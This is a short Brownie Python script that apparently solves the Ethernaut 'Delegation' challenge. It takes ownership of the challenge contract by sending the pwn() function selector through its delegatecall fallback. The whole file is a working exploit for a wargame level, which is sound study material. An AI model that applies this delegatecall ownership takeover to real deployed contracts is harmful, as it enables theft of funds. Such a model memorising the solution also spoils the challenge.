from brownie import Delegate, Delegation, accounts, config, network, web3, Contract

InstanceAddress = "0x904238F580E8223B3378acbA8a486Fe316Fd073c"

player = accounts.add(config["wallets"]["from_key"]) 

def solution_1():
    delegate = Delegate.at(InstanceAddress)
    delegate.pwn({"from": player})
def solution_2():
    delegation = Delegation.at(InstanceAddress)
    pwnSig = web3.sha3(text="pwn()")
    player.transfer(delegation, data=pwnSig)
def main():
    solution_2()


